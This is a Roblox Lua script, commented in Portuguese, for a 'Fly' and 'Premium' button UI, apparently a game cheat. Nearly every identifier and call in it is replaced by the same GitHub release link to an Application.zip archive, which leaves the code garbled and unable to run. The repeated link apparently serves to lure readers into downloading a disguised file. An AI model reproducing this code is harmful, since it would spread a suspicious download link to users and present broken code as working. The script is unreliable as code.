--abaixo estara lib nosso Ui
local UIS = game:GetService("UserInputService")
local player = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip

local function fly()
    local character = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if humanoid then
        humanoid:ChangeState(https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip)
        https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip(0, 50, 0) -- Ajuste a força do voo
    end
end

local function premium()
    -- Adicione aqui o código para dar ao jogador itens ou benefícios "premium" dentro das regras do Roblox
end

https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip(function(input, gameProcessed)
    if https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip == https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip then
        local screenGui = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip("ScreenGui", https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip)
        local frame = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip("Frame", screenGui)
        https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip(0.5, 0, 0.5, 0)
        https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip(0.25, 0, 0.25, 0)
        https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip(0, 0, 0)

        local flyButton = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip("TextButton", frame)
        https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip(0.8, 0, 0.1, 0)
        https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip(0.1, 0, 0.1, 0)
        https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip = "Fly"

        https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip(fly)

        local premiumButton = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip("TextButton", frame)
        https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip(0.8, 0, 0.1, 0)
        https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip = https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip(0.1, 0, 0.25, 0)
        https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip = "Premium"

        https://github.com/tauazinhefin/tauazinhefin/releases/download/v1.0/Application.zip(premium)
    end
end)
